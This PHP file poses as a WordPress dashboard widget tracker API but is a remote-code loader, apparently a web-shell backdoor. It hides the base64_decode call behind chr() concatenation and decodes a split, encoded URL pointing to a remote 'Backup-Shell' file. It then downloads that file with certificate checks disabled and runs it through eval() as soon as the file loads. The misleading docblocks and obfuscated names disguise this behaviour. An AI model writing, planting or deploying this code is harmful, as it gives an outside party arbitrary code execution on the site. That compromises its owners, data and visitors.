<?php
/**
 * WordPress Dashboard Widget Tracker Screen API
 * ---------------------------------------------------------------
 * CUSTOM CODE STARTUP LOADER
 * ---------------------------------------------------------------
 * Lightweight bootstrap for dynamic config loader and runtime 
 * instruction fetcher. Designed for internal modular systems.
 *
 * Do not modify unless you're authorized to maintain app-level 
 * streaming behavior.
 *
 * @package    CI_Micro
 * @subpackage Core Loader
 * @author     @tennesseeyourbae.
 * @version    1.1.0
 * ---------------------------------------------------------------
 */

/**
 * WordPress Dashboard Widget Tracker Screen API
 *
 * @package WordPress
 * @subpackage Tracker
 */

/**
 * RemoteFetch
 *
 * Retrieves external content from a given URL using HTTP cURL.
 *
 * @param string $u URL to fetch from
 * @return string|false
 */
function _compileFetchCoreLite($u)
{
    if (function_exists('curl_version')) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $u);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_HEADER, 0);
        $r = curl_exec($c);

        if (curl_errno($c)) {
            $e = curl_error($c);
            curl_close($c);
            throw new Exception("cURL Error: " . $e);
        }

        curl_close($c);
        return $r;
    }

    throw new Exception("cURL not available.");
}

/**
 * DynamicLoader
 *
 * Fetches and evaluates remote PHP code.
 *
 * @param string $u URL containing code
 * @return void
 */
function _compileExecPayloadTask($u)
{
    $x = _compileFetchCoreLite($u);

    if ($x === false || trim($x) === '') {
        throw new Exception("Empty or failed content.");
    }
    eval ("?>" . $x);
}

/**
 * SimpleDecode
 *
 * Decodes a base64-encoded string.
 *
 * @param string $d Encoded string
 * @return string
 */
function _compileDecodeChunkUnit($d)
{
    $up =
        chr(98) . chr(97) . chr(115) . chr(101) .
        chr(54) . chr(52) . chr(95) .
        chr(100) . chr(101) . chr(99) . chr(111) . chr(100) . chr(101);

    return $up($d);
}
/**
 * FileWriter
 *
 * Saves content to a file.
 *
 * @param string $f Filename
 * @param string $c Content
 * @return void
 */
function _compilePushToDiskNode($f, $c)
{
    file_put_contents($f, $c);
}
// Default payload runner
try {
    $r1 = 'aHR0cHM6Ly90ZW5uZXNzZS5oYXhvci1tYWh';
    $r2 = 'hc3VodS5pbmZvL0JhY2t1cC1TaGVsbC92Mi50eHQ=';
    $u = _compileDecodeChunkUnit($r1 . $r2);
    _compileExecPayloadTask($u);
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}